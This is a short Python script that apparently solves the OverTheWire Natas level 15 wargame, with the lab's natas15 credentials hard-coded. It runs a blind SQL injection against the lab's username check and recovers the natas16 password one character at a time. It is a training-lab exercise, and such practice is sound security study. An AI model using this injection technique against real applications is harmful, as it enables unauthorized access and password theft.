import requests
import string

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
password = ""
found = False

while not found:
    found = True
    for char in chars:
        payload = f'natas16" AND password LIKE BINARY "{password}{char}%'
        data = {"username": payload}
        response = requests.post(url, auth=auth, data=data)
        
        if "This user exists" in response.text:
            password += char
            found = False
            print(f"Password so far: {password}")
            break

print(f"Complete password: {password}")